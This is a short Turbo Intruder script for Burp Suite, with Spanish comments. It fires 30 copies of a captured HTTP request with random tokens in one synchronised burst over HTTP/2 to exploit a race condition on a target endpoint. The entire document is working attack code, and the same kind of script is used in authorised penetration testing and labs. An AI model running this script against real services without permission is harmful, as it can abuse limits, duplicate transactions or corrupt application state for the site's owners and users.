import random
import string

def queueRequests(target, wordlist):
    # Motor de alto rendimiento
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False,
                           engine=Engine.HTTP2
                           )

    MARKER = "RACE_CONDITION"
    num_attempts = 30 

    for i in range(num_attempts):
        # Generamos un token aleatorio compatible con Jython
        # Crea una cadena como 'aB8k2L9p'
        token = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
        
        # Sustitución del marcador en la petición
        current_request = target.req.replace(MARKER, token)
        
        # Encolamos para el disparo sincronizado
        engine.queue(current_request, gate='race_gate')

    # ¡Fuego! Disparo sincronizado
    engine.openGate('race_gate')

def handleResponse(req, interesting):
    table.add(req)
